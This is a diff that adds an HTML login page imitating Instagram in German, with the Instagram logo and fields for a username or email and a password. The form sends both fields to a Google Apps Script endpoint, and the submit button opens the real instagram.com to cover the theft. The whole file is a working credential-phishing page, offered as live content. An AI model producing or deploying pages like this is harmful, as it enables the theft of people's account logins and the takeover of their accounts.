@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Anmeldung</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" type="text/css" href="stylesheet.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    </head>
+    <body>
+        <img id="logo-title" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png">
+        <form id="gform" method="POST" action="https://script.google.com/macros/s/AKfycbxpv_amdhMtZfOP3hlp2l-YwkDdtTPGbroxTB23/exec">
+            <input class="form-control" name="username" type="text" placeholder="Telefonnummer, Benutzername oder E-Mail-Adresse">
+            <input class="form-control" name="password" type="password" placeholder="Passwort">
+            <input onclick="window.open('https://www.instagram.com');" class="form-control" id="absenden" type="submit" value="Anmelden">
+            <p id="oder"><span> ODER </span></p>
+        </form>
+        <img id="content" src="content.png">
+    </body>
+</html>
